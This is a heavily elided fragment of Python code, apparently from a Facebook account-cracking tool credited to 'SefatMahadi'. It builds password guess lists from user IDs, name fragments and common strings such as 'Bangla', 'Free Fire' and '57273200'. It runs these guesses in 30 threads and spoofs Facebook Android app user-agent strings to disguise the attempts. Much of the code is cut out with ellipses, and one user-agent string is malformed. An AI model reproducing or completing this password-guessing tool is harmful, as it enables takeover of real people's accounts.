...
def ___uids___():
    ...
    with tred(max_workers=30) as SefatMahadi:
        ...
        for love in user:
           ...
           cu = love[:7]
           fu = ids[:8]
           passlist = [love,ids,bu,cu,fu,'Bangla','bangla','Free Fire','free fire','57273200','@@@###']
...
def ___random___(ids,passlist):
    try:
        ...
        for pas in passlist:
            ...
            android_version = str(random.randrange(6,13))
            ___MSUA___ = '[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]'
